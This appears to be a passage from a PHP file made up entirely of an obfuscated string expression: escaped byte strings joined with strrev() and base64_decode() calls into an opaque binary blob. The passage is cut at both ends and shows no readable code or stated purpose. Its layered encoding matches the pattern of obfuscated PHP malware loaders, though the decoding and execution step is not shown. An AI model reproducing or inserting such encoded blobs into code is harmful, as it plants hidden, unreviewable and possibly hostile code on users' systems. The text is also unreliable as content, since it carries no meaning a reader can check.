7\66\12\222\316\204\71\335\3\35\134\264\330\225\244\251\276"."\172\20\162\255\171\160\362\70\217\260\226\106\251\145\0\27\271\212\271\14\203\242\40\102\211\26\163\230\20\32\234\335\241\347\122\122\246\171\132\322\226\112\125\373\240\277\175\242\253\264\351\42"."\x5d\x4f\xc1\xad\x3f\xbf\xd4\x81\xc3\x80\xc0\xf2\xb6\x3b\xc9\x3\xb5\xdf\xcb\x29\x6\x8d\x3c\x5a\x90\x52\x16\x31\x6a\x85\x5\x5\x8a\xb4\x24\x57\x2\x51\x41\x6c\x38\x3b\xe9\xae\x2f\xc8\x6a\xcb\xd4\x90\x47\x8b"."\136\216\133\263\132\31\215\235\73\132\370\262\110\116\347\244\131\264\204\21\277\46\30\12\16\211\231\116\123\360\105\353\220\164\171\120\105\142\201\45\341\253\375\272\355\132\154\233\2\261\120\263"."\332\31\140\227\75\264\174\336\157\245\6\55\77\66\307\64\206\364\260\221\360\143\327\5\230\170\175\374\162\77\131\40\124\55\141\26\154\56\273\352\31\65\145\100\105\303\241\46\265\45\24\225".strrev('vâÉÆ›$R|MmÄÇxâš[ã{‰–ÌÒÈ‘Í¨´,êîÕ",XÔ†t	˜»,¿º/œ¾').base64_decode('/oFFgJgCJqRoPja3BaLchH+mr8ZXK3DRB1V8d6GReRSIxQPRMi5gqGsYoAxwBwMZ2iLLlQ==').strrev(''."\0".'ît°P]g17[’È[‚÷vâ:„¨9 pÎÁñC&”ÄÌÚ†\'JDGxPŸ=F#½«¸Hæ').base64_decode('BvLTiHwzSC6RlwRzqdtT2VPRM62nqqd6la/H6gWGSEbEkIcHIp0t0LwGHkqxbXx7DAkiNA==')."\x18\x89\x6\x9a\xc3\xac\x2a\x88\x1c\x21\x18\x69\xe\xd1\xc0\xde\x2b\xee\xdd\xf3\xf0\xc5\x7b\xaf\xdb\x3e\x76\xe1\x16\x54\xd0\xf8\xb5\x1b\xc6\xaf\x7a\x0\x89\x4f\x58\x64\xda\xbe\x79\xef\xa3\x17\x8f\x5f\xb1\x63"."\174\63\210\72\312\276\35\77\335\263\353\261\275\127\334\76\266\375\352\361\53\37\332\173\355\271\64\341\355\73\356\35\333\164\73\257\230\362\366\345\217\216\137\174\53\27\243\250\364\344\101\271"."\337\336\270\145\357\256\355\130\210\272\345\254\361\373\57\32\277\176\313\330\246\233\306\256\271\175\357\305\73\306\156\76\147\354\274\55\373\166\154\233\354\46\44\32\357\146\103\1\27\305\375\147"."\340\113\376\264\173\173\254\351\270\153\253\321\157\25\276\330\201\176\231\175\72\261\124\76\255\53\330\321\34\164\137\215\222\243\340\75\147\32\245\20\152\274\3\322\264\5\336\167\130\234\170\333".base64_decode('aKycsBbrYPylSkmVaQnGmqOhpiBcHeADNZXIfGB/gaCx6DIe5jdpS7wdKVWMmKsVR0M0Xw==').base64_decode('0swUszlSWaUCW5JVeDCbIfe0lAq83iOAjl0DVGFfKMTguHJlpafGU1utgCskmgMcICkVYA==')."\267\316\363\71\76\342\111\70\142\265\236\232\152\245\42\77\130\1\365\22\375\212\152\257\122\114\113\321\74\125\120\141\271\272\2\27\261\61\313\56\150\6\342\153\112\322\303\101\74\77\372\165".base64_decode('ODVK+kQOOk4Iww1TAh0tTkzqC6mzkph9Jn02d6rChrmyWknAhYwyiSSbozMaHZ1RNR34RA==')."\347\142\76\336\364\266\205\102\257\337\321\152\151\26\33\50\200\222\241\302\120\72\132\14\327\104\315\100\203\103\361\121\200\247\340\333\10\274\44\304\216\170\2\33\101\14\347\203\130\46\215\70"."\xa9\xaa\xa0\x72\x29\x6d\x67\xd6\xea\x67\xac\xe\x1c\x0\xb4\xaf\xe4\x6d\x60\xb4\xcc\x2d\xa3\xb8\x8b\x2b\x7c\x91\x30\x18\x6f\x6e\xa3\x54\x1e\x93\xc8\x3c\x95\x98\xea\x20\x54\xd1\x9d\x8a\x83\x44\xf8\xe6\x6\xf0"."\350\164\301\14\341\10\202\27\352\300\267\114\351\5\272\130\163\133\260\75\340\3\46\116\51\201\342\143\111\120\151\124\52\61\347\243\240\112\107\367\223\17\261\56\213\223\257\242\171\245\332\110"."\166\243\275\220\357\207\312\300\350\53\304\223\201\106\262\64\126\122\147\63\120\44\367\305\26\211\306\125\324\1\300\236\45\256\133\51\255\26\222\161\72\276\25\66\304\304\315\76\44\214\231\314"."\x6d\x4e\x2a\xc1\x5c\xb6\xa1\xc2\x71\x99\xcd\x91\x8e\xd6\x10\xbb\x2b\xd8\x92\x80\xf2\x52\xa6\x3\xa9\x25\x1a\xc2\xbe\x44\xe0\xfb\xa\x2b\x4a\xba\xa1\x89\x22\xc2\xda\x3\x45\xf2\xc3\x29\x1e\x16\xee\x19\x70\x2"."\x5f\xf3\x51\x44\x2c\xf9\x28\xc2\x17\x1b\x8c\x25\xf9\x96\xc3\xdf\x8f\x75\xf0\xb0\x10\xc5\x51\xa4\x2b\xc6\xee\x89\x60\xee\xbb\xbc\x85\x87\xdb\xf8\x8d\x6a\x9c\x10\x89\x4a\x91\x40\x34\xd0\x1e\xe3\xd1\xe8\x72\x7e".base64_decode('74TD6P0TtaOrXXD8cGAZIpYI62+2V/KfUeWbtrC6h17uo0H6s4jF8IWn3rW1HmXW+mrA4Q==')."\76\71\354\264\221\143\2\57\376\312\151\141\65\34\131\114\343\304\347\135\60\227\22\73\47\245\133\101\322\167\134\110\337\26\133\272\370\154\120\20\15\53\364\216\260\322\21\131\36\20\156\324"."\xa4\x4\x80\x8\xaf\x6a\xfe\x33\xba\x7b\x86\x7b\x7c\x48\x58\xb0\x56\x89\xcb\x7a\x2d\x4d\xa\x13\x43\x88\x3b\x16\x50\x44\x40\xee\x0\x5b\x46\x57\x79\x60\xc5\x50\x33\x66\x3f\x73\x94\x84\x18\xe2\x3a\x10\x17\xe8"."\xef\xa\x16\x20\xbc\x12\x32\x24\xc9\xfd\xef\x11\x5e\x89\x80\xf7\x74\xb5\x67\x5d\xcf\xa9\x3d\x5e\x1f\xbd\x21\x89\x85\x97\x1e\x8f\xa8\x92\x1a\x5c\x81\xd6\xd8\x58\xcc\x71\xbd\x53\xcd\xe2\xeb\xe3\x50\x3a\x6a\x25"."\204\350\254\245\221\371\360\3\173\303\371\260\71\201\350\202\106\76\230\301\323\326\165\240\277\213\343\353\202\350\157\30\375\204\343\150\270\14\216\200\246\144\70\264\64\270\16\377\43\22\252\171".base64_decode('R9LrT84MoY516F/EYNaFOtyFNQXjy4NBisDC8CtQEcOBpko+EfGVBEgWVxSgaFWtIp3p7Q==')."\x9d\x5e\xad\xaa\x7e\xab\xb\xe8\x85\x7b\x16\xa9\xaa\x3c\xa5\xb6\x12\xd6\x90\x40\xac\x79\x1d\xe7\xbe\xe\x82\x28\xa5\x5\x72\x81\xc0\x49\x8\xdc\xd3\x1f\xc4\x17\x47\x23\x5d\x9d\x52\xbc\x2d\xb0\x2c\xd4\xb1\x98".strrev('Ã¾E¸P®¦²Îvg(o‘$EœAn’½K$X©†œr„'."\n".'1š‹¨b„´­hXÓüÅ')."\x11\x69\x68\x2a\xe1\xea\xb0\xa6\x4c\x65\x95\x63\x71\x72\x9b\x9d\x45\x70\x97\xb3\x30\x21\x37\x16\x21\x7d\xc0\x22\xb4\x3\x58\x8c\x74\x17\x8b\x10\x47\x87\x2c\x42\x1a\xca\x22\x78\x77\x12\xec\x60\x69\x68\xa3\x8a"."\x36\x99\x6c\xf7\x99\xd6\x86\xf8\x95\xcc\x79\xa9\x84\xe4\x76\x4\xf3\x60\x1f\xd5\xdd\x61\xbf\x34\x68\xfb\xa6\x71\xed\xad\x4b\xdd\x4a\x34\x65\x92\xf6\x81\x5a\x6\x2a\xd2\x5d\x70\xac\xb7\x95\xb4\x5b\x7e\x8a\x81"."\204\117\202\203\176\173\126\55\44\302\361\52\106\247\364\66\262\35\67\354\214\343\243\160\127\21\175\64\104\256\212\112\237\145\167\72\210\232\122\65\45\325\71\131\267\145\200\120\214\121\75\73"."\xe8\x94\x85\xde\x9\x1b\x48\x12\x6d\x33\x8d\x3a\x77\x54\x9c\x4d\xad\xe2\x1b\x25\xf0\x43\xe1\x81\x5f\xa8\xd1\x31\xf4\xa7\x7\xa2\x4c\x91\xd2\x3\x1f\xa9\xf4\xc0\xa2\xdb\xc3\x4\xf6\xee\x9e\x91\x9a\x1a\x2f\xfa"."\147\16\372\333\204\376\66\243\277\101\14\150\355\31\231\335\212\2\163\133\173\375\160\6\324\323\123\61\121\167\2\2\353\124\210\126\320\50\313\5\75\215\326\310\144\32\373\275\121\355\54\323"."\xdf\x93\xcd\x9c\x50\x91\x53\x15\xbe\x88\xb7\x44\x23\x9d\x54\x62\x51\x42\xad\xa\x75\x3\xa1\x54\x52\xa5\x7f\x25\x88\x62\xcd\xd1\x20\x9e\x4d\x14\x8b\xa5\x55\x55\x3a\xd4\x6b\xb\x2a\x15\xb8\x21\x5e\xed\xcc\x15"."\352\150\11\256\120\52\215\324\210\252\151\52\144\126\320\334\145\5\51\45\45\261\22\150\135\341\230\311\112\233\303\212\114\216\154\177\335\114\141\161\101\242\45\242\34\161\350\300\356\340\172\140".base64_decode('E89TqARNk0IxtMCHw6SlKMmwsODrUbjfBQzEmxWqqoWCWAItiCYFV8SjAQwk0uqRR6A/hA==')."\1\341\335\124\41\253\321\213\251\104\306\363\255\2\245\302\52\207\110\111\205\115\54\124\2\205\221\45\122\152\23\117\41\232\5\332\315\262\336\141\51\110\351\64\326\31\15\265\7\242\53\241"."\xcb\xc4\x9e\x1\xa6\xa8\x99\x71\x5c\x4f\x16\x11\xc3\xea\x92\xae\xca\x77\xa0\x5a\xcb\x57\xe7\xe9\x18\xaf\x63\x1c\x19\xed\x7f\xd7\x1\x47\x46\xb5\xa1\xc1\xa\x3c\xf2\x34\x8\x7e\x6c\x55\x7e\xff\x99\x29\x5d\xaa"."\200\216\53\74\54\300\174\120\220\53\132\114\275\226\105\54\212\307\304\250\1\355\303\250\310\251\362\45\63\341\150\27\57\252\170\220\141\2\4\133\3\135\141\31\2\135\245\54\15\256\374\202".base64_decode('OcJqWm6OsDSmvhEHVLwvoGVVM6Gl1F1GVR3azRZz2D8MU8mJ29pDWJunFarqZrJMrO40Fg==')."\xe8\x8a\x47\x54\xb4\x2a\x45\x83\x78\x8d\x28\x69\x8b\xb4\x87\x97\x7\xc\x32\x63\x4\xee\xd1\xf8\xb\x9a\xcd\x70\xca\x35\x9b\xe7\xe7\x5a\xac\x60\xc7\xe2\x50\x47\xb0\x11\xdf\x4\x47\xb2\x2\xab\x2e\xe8\xe9\xb0"."\207\317\71\120\116\50\242\206\221\174\255\312\252\270\120\4\264\326\16\367\221\252\52\334\256\370\64\141\161\156\27\212\222\63\76\303\44\326\335\355\374\42\10\61\107\107\304\22\20\316\27\270".strrev('ö™ÀO9%ĞÈ?3¹ÃÍVqsK[œÛ¸øêºó<J™)ÀlÃV——~Aô¼·8¤f')."\101\162\72\225\163\126\17\55\266\31\346\355\113\325\105\153\262\272\145\361\63\353\170\132\127\254\274\236\44\156\101\25\160\146\247\244\114\335\22\76\304\241\357\311\236\213\5\355\264\160\63\41".strrev('Ê#D|]…†'."\0".'–5Ş!IB2º½G#39?©’Q[‰íî/Òb	-'."\n".'\'=1ÙÌ\\bimÓû').strrev('c™h¾4îÄÁ,Ë>:÷%°¾çßÇ@5‚v8¹j\\äÈ^§fs%y5º@¶kÑšeì').base64_decode('KlIz6dImjjKmkHVcCivm0Ee88g0pRDsEKN3JYC4VaWw2GMQg+oRAP0DYb4Gl+IT7HVImlg==')."\xad\xbc\xc2\x9\x46\x4a\x93\xef\xb1\x4a\x5e\xe8\x27\xcb\x94\x42\x86\x5c\xd0\x76\x9f\x21\x7b\xc4\xf0\x9\x1f\xc4\x7c\xba\x2c\xe2\x3\x85\xef\x77\x83\x75\x0\x16\xdb\xfb\x54\xa9\x2e\x9d\x1c\x5f\x78\x1f\xa5\xbd"."\41\15\3\1\320\40\231\340\212\70\273\342\44\106\356\151\30\170\56\214\112\164\44\101\333\231\277\50\360\206\34\66\101\330\306\27\114\164\33\174\207\71\170\125\50\2\171\175\72\276\255\105"."\357\316\4\271\63\111\224\221\272\174\373\362\114\135\222\103\350\11\330\113\331\174\315\200\310\77\130\40\152\250\57\377\140\124\27\322\1\312\106\56\307\175\151\46\301\156\311\227\110\46\211\105"."\xbb\xf2\x10\xd2\xa4\x17\x79\x80\xa\xd2\x90\x2c\xe8\xd\xad\xb\x1d\x11\xb5\xd\x2d\x3d\x11\x26\xbc\x18\x56\xdc\xc1\xea\x59\x2e\x60\x27\x36\x92\xad\x92\x7e\x72\x4b\x19\xb6\x92\xf3\xc8\x41\x17\x3d\x9b\x85\x81"."\x5f\x8b\xb8\x38\xf\x31\xeb\x16\x70\x3f\x26\x84\x86\x0\xfd\x59\x99\x4d\x79\x51\xc5\x81\x2\x53\xba\xcd\x9d\x40\x91\x6b\x9f\x92\x8b\x2a\xe9\x8e\x77\x96\x33\xdb\x61\xc9\x3\xac\x36\xa4\xe3\xbb\x70\x4c\x51\x53"."\142\30\4\115\51\155\34\124\21\237\244\305\42\135\121\166\352\203\343\130\333\245\106\203\315\53\371\1\14\207\266\6\226\271\41\41\254\255\14\54\56\13\346\72\64\14\47\233\125\65\32\301"."\312\306\140\270\325\225\41\326\306\275\7\73\141\152\70\324\261\264\154\2\22\116\332\245\54\24\30\212\7\333\335\60\147\11\261\140\40\312\134\133\343\170\123\70\322\54\45\207\42\245\75\301".base64_decode('pR8OpKpKCvSfUdWzluyeGtAmKrUO6zS8au/06oU966urevwLfdO4Ko6yLuku8QRgiy1EDQ==')."\156\0\136\303\30\220\146\203\230\337\347\203\217\360\200\277\307\317\74\215\371\105\42\374\12\374\51\353\234\353\15\270\222\217\121\267\115\216\212\272\174\232\60\47\2\76\367\205\65\225\335\122"."\203\50\276\265\254\362\31\210\17\164\325\330\312\30\37\53\47\314\101\221\224\246\145\103\20\27\62\372\333\51\243\142\33\243\262\210\16\222\166\334\341\226\101\76\303\24\263\105\114\353\224\231".base64_decode('LGJHUWKMxI1vBPI5ikAMfVDoC2BWxtjszaF1ExbmZiTBLm4LLVkabu+IdJ4WjcW7li1fsQ==').base64_decode('EhyBNjCi6VO8TDsCnnX9SHb3D7FnBJbhzYlu+WXBjgNRG7FLZOa7jSo1eCrmHv7ySbQ0fw==')."\66\147\327\116\200\321\131\320\23\246\151\117\220\272\254\375\213\13\206\304\356\36\253\227\123\151\112\37\142\215\326\301\237\204\260\326\263\304\336\14\44\17\257\374\256\1\46\133\131\210\114\45"."\134\42\2\0\304\22\55\11\22\316\165\233\170\307\246\321\121\135\130\76\232\303\222\167\151\66\173\120\166\20\257\300\333\355\142\354\334\225\71\163\135\115\174\163\272\35\173\256\366\152\203\216".base64_decode('dOFxerUX7WYdcZdzz1PJUtBu9hfq/DauZw4tH1AXECjk2UKWFG7ShBeuNtdc5UDuGyRGDA==')."\76\33\224\172\170\47\240\25\211\341\51\245\233\112\326\160\26\200\245\62\342\352\236\106\75\212\360\310\315\264\270\116\127\333\154\272\140\205\233\164\63\67\51\173\206\140\314\67\73\50\114\132"."\262\203\334\200\44\351\20\76\360\72\57\142\5\111\276\200\307\74\120\132\323\50\63\16\206\373\256\115\243\121\351\231\42\207\127\16\371\371\23\55\237\157\116\343\66\70\346\260\3\224\224\43"."\x7d\xd8\xac\x46\x36\xdd\x71\xfa\xfb\x46\xc9\x2d\x54\xc8\x4b\x71\x7c\x4b\x84\xb8\x3\xef\x3e\xc9\xb5\x77\x49\x9\x48\x20\xcc\x5\xd9\xd5\xfe\x92\x54\x24\x3d\x1a\x22\xf9\x8b\xeb\xd2\x4e\xba\x97\x23\xc3\x66\x2"."\xe6\x4\xcc\x44\x7c\xfa\xf\x4\x37\xe2\x35\x2d\xcb\x9b\x2f\x98\xd8\x78\xaf\xd1\xc8\xf6\xfb\xad\x61\x48\xcb\x68\x96\xbd\xcc\xe1\x2d\xe9\x4b\x7d\x7a\x63\xa7\x20\xed\x5c\xb4\x86\x2a\x8c\x78\x9\x55\xb3\x8f\x40".base64_decode('VgzyF4hBk2cYlg8P8eip1jCC8aO6+bHDRyL3cpu7SIwdHDlbT+2LpF05eJpbzMx8uPts4Q==')."\55\231\352\373\151\130\170\31\106\342\173\240\37\373\110\61\163\354\326\1\175\76\101\366\265\236\322\111\165\371\325\176\311\115\71\176\302\3\115\165\146\226\50\71\54\107\2\141\77\37\106\342"."\x3f\x58\xf6\x3\x89\xbb\xdc\x9b\x75\xbc\xdc\x41\x7\xc8\xe9\x6\xdc\xd2\xf5\x41\x66\x46\x89\x47\x5b\x70\x94\x2\xf7\xd6\x4e\x8f\x81\xbd\x65\x1\x5e\xc9\x30\x92\xce\x27\xe9\x45\x7\xfc\x39\xd0\x9\xa4\xe9\x5b"."\x11\x50\x5f\xfa\x73\x7a\xb9\xda\x7b\xb\xc2\x81\x3a\x1a\x1d\xfa\xf2\xc4\x52\x7d\x94\x39\xba\xfe\x62\x5f\xd9\x3d\x8b\x7b\xda\x7b\xe2\x72\x73\xed\x82\xd6\xd7\x87\x2a\x2b\x79\x78\xe5\x83\x28\x3c\xa6\x3\x25\x91"."\27\130\130\363\47\366\267\16\347\33\247\226\165\327\16\211\121\332\356\146\274\363\32\301\317\143\10\367\242\135\321\260\343\320\12\120\131\13\327\244\275\315\314\52\314\54\146\122\144\147\213\76"."\145\146\320\246\136\34\137\217\137\365\375\361\373\266\355\173\354\173\343\27\337\272\347\301\235\343\327\77\114\341\264\307\132\364\34\37\367\361\213\56\333\273\363\206\175\333\37\173\373\252\355\357"."\77\262\171\337\216\237\142\363\244\33\157\245\326\112\143\133\67\214\157\273\147\154\353\246\175\367\237\73\376\360\45\343\67\234\363\366\65\227\274\165\326\6\230\71\71\342\347\64\120\350\57\212"."\x7e\xa2\x59\xc6\xbf\xff\xc8\xd8\x23\x5b\xdf\xbe\xe2\x9a\x7d\x3b\x76\x48\xf8\x36\x36\x9e\xcb\x48\x53\x7\x8d\xe2\xd8\x79\x1b\xdf\x3e\xe7\xf6\xb1\xad\x97\xee\xbd\xe2\xc6\x92\xc\xf4\x3\xee\x71\xc6\xcd\xdb\x76".base64_decode('wd5rz5VS3JmaiAt4sZ3neWjC2CVb9v7wHncm+iZAmUzjV56/Z+cDrkwdZqyYTDdJvubHNw==')."\x9f\x3f\xb6\xfd\x5a\xfe\x91\x3d\xf\x6e\xa1\x36\xf4\xae\x2c\xdc\x5c\x8e\xe3\xd3\xf2\x4b\xf1\x63\x8c\xa2\x5b\x4c\xdd\x42\xeb\x68\xbb\x66\x27\x61\x12\xef\xbd\xfb\x51\x54\x1f\xda\x63\xf2\xc8\x8d\xed\x38\x6f\xef".base64_decode('98/ee/eFMBJX7xi75Lbxu2/Ze9N2XixQlcOKGBdw74Z9D2wcv+oBjoinfEoROISiKA6+Lw==')."\x40\x3e\xb8\x77\xd7\xa5\x7b\x77\x5e\x8f\x89\x64\xd3\x86\xbd\x1b\x1e\x1a\xbb\xfe\x9e\xb1\x1b\xce\xe2\x9f\x1d\x7b\xf0\x41\xd1\xcb\x11\x3f\x79\xc4\xac\xc\xb3\x3d\xd\xc3\x81\xdd\xf6\x9\xf3\xd3\x7c\x51\x7a\x47".base64_decode('T2ZwWCTj9p5YYUWfb2CSFnlpAV4BamSTFvVjrslMQd+vrUCss6Kh4pQq9Ftd4anAGxASxw==')."\xcc\x13\x3\x48\x3d\x2a\x1a\x4e\xa9\x22\x81\x6a\x70\xd3\xb4\x6\xd6\xd\xc9\x57\xb3\x98\x78\xa0\xc6\x5d\x88\xb8\x87\x74\xd8\xb9\x90\x2c\x43\x78\x91\xab\xf3\xd7\xf9\xd9\xc2\xb7\x70\x35\xfe\xa2\x78\xbb\xab\x8b".base64_decode('rzdCHqQrD310hZ2Iduj2sFmQ7bHrauCOVFpaN7IWrAD0MQShAwPSo/aHl2wpJTrIkKAWzw==')."\16\364\237\376\170\154\343\175\157\137\165\267\33\227\52\126\0\27\213\147\45\17\77\322\113\46\143\227\136\135\372\75\202\357\374\32\103\36\73\373\372\275\127\270\60\231\321\255\42\151\323\104"."\6\102\375\56\76\302\327\5\71\13\245\367\377\315\54\242\272\315\6\254\345\247\200\25\336\256\374\150\61\347\305\32\56\157\114\366\340\351\172\277\250\306\211\217\165\124\116\174\131\136\110\212"."\x75\x37\x2b\x82\xf4\x5d\xa5\x6\x45\x7e\xf5\x4c\x72\x49\x4e\x74\xa1\x74\x61\x63\x66\x50\x0\xc3\xa2\x4\x3\x9\xb1\xa2\x4f\x5c\xa9\xc1\xd2\x81\xea\x94\xe\x16\xb9\xea\x8b\xcd\x58\xbc\x48\xc4\xc7\x73\xc\x4d"."\134\333\220\336\27\220\121\234\317\150\271\37\327\162\367\2\311\202\225\247\136\371\141\257\21\264\103\303\311\370\115\26\57\126\305\172\215\324\104\51\202\161\224\255\152\22\136\161\50\207\322\125"."\64\122\356\117\22\163\35\157\261\310\76\130\266\120\171\377\310\20\110\43\102\274\74\307\163\44\32\32\153\176\332\350\176\355\104\154\276\265\322\307\70\126\146\123\112\335\214\206\231\163\321\377"."\24\162\52\263\66\52\346\331\65\6\24\144\217\165\114\366\367\61\136\43\236\305\142\155\303\3\56\75\41\343\0\213\156\344\117\163\60\46\345\300\23\265\165\74\352\6\15\245\272\37\351\315".strrev('bU(Ø¦~¨ƒØ@+a'."\0".'h Ì‰˜šø·À Yú|áÔ’}ŞÁµ¸e@ÛùSÁ¶YDr')."\xc9\x74\x31\x37\xd8\x28\x25\x2a\xb6\x69\x2a\x59\x2d\x37\xa\xfb\xcf\xa9\x56\xc3\x54\x6b\x1e\xfe\x50\x23\xbe\xa2\x62\x4d\x65\xf\x43\xe1\x85\x49\x38\x25\xa5\x7e\xb1\x20\x85\x1e\x71\xf9\xf0\xb3\x6e\x3e\xbc\xea"."\x45\x8b\x80\xd5\x49\x78\x3a\xd\xc3\xa3\x5a\x90\x10\xee\x5a\x1c\xea\x90\xec\x2\x25\x80\xda\xdc\xd2\xa1\x6\x3a\x3b\xcb\x26\x40\xb7\x53\x65\x33\x36\xaa\xf1\xd\x48\x6f\x7a\xd2\xd0\x7c\xb4\xf5\x52\x92\xf8\x12"."\x54\x63\x5\x86\x56\x28\x56\x21\xc9\x3c\x77\x57\xf8\xc1\xcc\x8c\x20\x8\x29\x68\xbe\x1\x59\x2a\x71\x16\xa5\xf\xd1\x84\x97\x84\x68\x72\xe5\x82\xf9\x7e\x3\x72\xfa\xfc\x53\x30\x8f\xf6\x63\x3\xbb\xdc\xa9\x78"."\xe8\x64\x7b\x1f\x2\x6d\x15\xae\xc5\x14\x65\xbe\xa6\xd0\xee\x6a\xac\x24\xc7\x28\x95\x4a\x1a\xad\xe3\xdc\xba\x78\x81\x3b\x33\x7f\x87\x6d\xbe\x5f\x93\x13\xf1\x6c\x89\x9a\x6c\x7f\xc8\xf7\xe4\x43\xdc\x9\x67\xd9"."\x13\xb4\x80\xe4\xd8\x9f\xbc\x8b\xd4\xac\xe5\x96\x95\x66\xc1\x85\xfb\x92\x72\x12\x7b\x30\x33\x4d\x74\x9\xae\xd3\xd8\xf9\xf9\x5\xf3\xf1\xc1\xf\x33\xe1\xf3\x93\xc8\x7c\x7f\x7e\x81\x3c\xda\xe4\xa6\x5a\xe9\xc7"."\374\104\225\344\27\272\13\225\76\155\132\376\270\222\237\322\225\241\43\154\156\203\210\237\331\71\150\311\101\114\210\142\211\200\152\100\102\47\326\104\320\4\307\223\47\266\144\41\125\304\27\66"."\311\71\117\101\274\30\267\166\55\55\10\77\347\263\176\175\51\14\154\256\335\111\201\274\341\6\141\202\163\303\260\106\110\300\320\132\347\374\14\45\166\31\111\100\30\16\375\25\171\302\35\213"."\105\204\356\345\35\211\335\314\132\212\304\172\272\53\175\323\326\257\367\33\314\62\221\131\105\261\274\76\216\115\343\75\76\47\76\152\11\164\75\107\4\200\33\223\22\325\22\240\242\43\375\323"."\xc4\x25\x53\x6e\x81\xa8\x60\xb3\xc4\xc6\xc6\x5\xdd\x5c\xbc\xea\x65\x69\x2a\x51\xa4\xc8\x63\xc7\xc4\x53\xa3\x76\xe\x23\xa\xb4\x7f\x8c\x2f\xe7\xc1\xe6\xe\x21\x80\xf3\x69\x44\x19\x93\x8f\xa8\xf4\x2\x4e\x57".base64_decode('4gvFo3q0n+VwIJ93cCAWwYdeGSPh52yDHoT5kuIWJ0MhTMsFxwaFrgR8lYyAhxBXNQuczQ==')."\x71\x38\x2a\x8b\x3\x81\xcc\x31\x2b\x92\x38\xf\x4f\x9e\x6f\x25\xb\x46\xde\x76\xb0\x41\xfa\x3e\x74\x5\x79\x7f\x6d\x40\x1b\xd2\x28\x4a\x85\x2\xea\xba\xc6\xa\xf2\x8e\x46\x5\x9a\xd2\x34\x85\xf1\x3e\x5e\xc1"."\371\370\153\110\46\316\64\126\220\106\130\151\135\107\371\11\153\53\367\21\224\261\102\141\314\67\253\361\176\54\330\46\132\104\371\245\100\170\356\262\53\12\27\230\2\35\160\374\70\345\14\372"."\173\312\24\106\111\344\55\316\14\22\226\311\365\14\302\346\210\104\336\207\325\260\24\11\236\335\354\214\106\342\221\146\366\164\235\123\137\113\141\365\154\167\141\321\373\260\142\103\306\156\327\161"."\253\44\206\301\305\12\77\100\200\32\12\305\134\216\33\204\142\172\345\313\141\143\371\77\335\344\204\124\117\365\116\220\256\164\153\354\374\24\224\312\364\100\230\335\146\205\172\242\205\67\216\357"."\366\133\0\226\34\225\142\67\251\172\312\327\115\75\24\64\326\260\53\126\314\374\124\134\4\145\230\162\212\202\127\222\136\336\353\150\376\373\201\175\212\231\125\211\217\374\340\125\251\112\117\145"."\225\157\132\165\145\151\12\65\364\165\246\143\53\72\165\111\14\45\302\33\116\40\21\220\73\214\315\341\120\260\43\256\206\100\30\250\255\233\355\253\21\367\13\15\113\70\376\245\341\146\331\357"."\2\356\125\237\243\131\145\272\206\236\271\304\271\231\252\236\163\250\140\151\227\146\114\346\222\266\256\246\246\306\133\123\213\376\147\367\56\230\43\314\6\346\161\110\102\251\251\151\40\377\323\4".base64_decode('cu4BJOhMQSyR8XJAGNZ1qBCsnWiLXGSCaHczvpmq4KrBsAgzW0R9xFMsY6uOh0EVcv4PMQ==').base64_decode('XXRCVnrMMgaehZnLJErb7HiAehGHj6KNV66fdBDUnV+QRmhiBs2j19YbeQWDuVS3/DEf6w==')."\150\12\24\36\364\275\54\301\53\77\144\3\231\50\323\23\347\207\216\252\241\74\116\167\264\30\202\204\242\44\157\63\6\110\252\132\54\361\112\56\166\161\124\76\46\44\311\374\226\61\211\145".base64_decode('uG8UHO3gJdH3kuj9XujDMjMybQ6rQk7B0SU8RroUbzkZSaakm+C4X9n6JKFzwzZhFQQCHA==')."\161\370\61\150\70\35\222\250\122\126\271\157\347\141\104\326\222\270\63\47\176\265\31\127\324\213\353\335\40\172\21\361\267\0\177\111\212\332\101\263\372\52\300\161\150\224\370\330\247\317\25\23"."\305\116\303\221\45\3\156\273\7\233\214\233\343\264\303\155\141\310\142\322\350\261\3\260\330\227\30\1\62\110\220\1\350\321\135\63\367\117\53\25\340\116\162\345\11\320\163\263\222\14\0\57".base64_decode('xSbHi2WwMdyFTTzRNnOH27J7WqqTkozNLHhWRFj3sDKGpB2qL18w+xElWHKnIXhneTBHLw==').base64_decode('xSyDxGsv48lAfJDJ3kEH0hLOFrQUXzwl1JhwPC6AzhkuJTTzB99kIN76yvZcZNfhLAPvqQ==').base64_decode('nRBesy8gOqYCsQtazuqTDVQYmuBSWD0lP8epOsiE0SozH8M9JAw1nHAKo0oKx+lwnDC/jA==').base64_decode('HofqUCidVLiAMHvGOebw5g5kClO3sVHO5kx787xLWeByhoW7lT+BKp/D4S5VZf0RntFt/A==')."\131\370\62\204\350\44\266\22\252\42\353\72\56\240\201\263\45\51\206\113\147\107\240\150\323\155\121\155\250\7\203\25\372\274\270\202\37\115\237\354\34\237\322\14\360\354\232\211\244\113\354\354".strrev('Ñı¢ö¶£ğ¶-e…$CïáC¿ãG”+ƒÙSº&WÕ2¬˜í+¯âKœ¥¨±rêË„ÎZ')."\x3a\xbe\xec\xc0\x28\x75\x53\xb6\xcd\x3e\x84\xdb\x1\xa1\x14\x1b\x34\xc5\xb9\xc\x4b\x8b\x8a\x22\x17\x84\x96\xe7\x78\x1a\x2b\x86\x7a\x15\x52\xf7\x79\xe4\xd\x8f\x32\xa9\xd8\xc7\x8\xfb\x1a\xf7\x6\xe\xcb\x1".base64_decode('wjFtvqfGxQdS0jobloXiOM3iXSCq6jA3kF4i4KioGqzyGqsbsTUlLz5I23xX1G2Zi3NIYg==').base64_decode('EIpKSzQREGy2xrP3HoRFKwkKrvzm1eexwEZBXDHJ+LFM/aBUXiauQU4Y1IKkU9CTZiGFVw==')."\x49\xc9\xab\x4f\xce\x8e\xea\xfd\x72\x94\x58\x36\xb0\x29\x22\x7c\xc5\xcb\x45\x60\x7\x6a\x12\x2f\xc2\x53\x33\x90\xb4\x8b\xb2\x3b\x36\xe9\x39\x9\x14\x93\x5e\x1c\x91\xa4\x57\x6f\xad\xc2\xc5\x5e\x95\x96\x4c\x23".base64_decode('06UEgl9OAnapd6VLckT7FSsm+EG1SxZl9+4UWdRjF+lwAcQTFm6BJaehYrEbd9EyOQv5Zg==')."\111\26\232\206\245\55\161\343\116\116\261\360\303\41\135\154\24\313\245\224\371\24\111\222\172\64\311\305\157\350\35\321\111\220\60\252\63\123\160\157\155\235\167\6\154\173\344\133\170\154\107\107".base64_decode('Y3i3KZEB3hMz3gbG04AncEzpyJ/4nhKudIg7LT6exO8WjxUkAUPnhtXEMZXM64U1E7W3xg==').base64_decode('CF3l0mkP4eQWh7W8CwHND2c6vAwiKkN9Y5kOi0VXIfCCjfz2Cckl2iGuFCCQSd8fkTp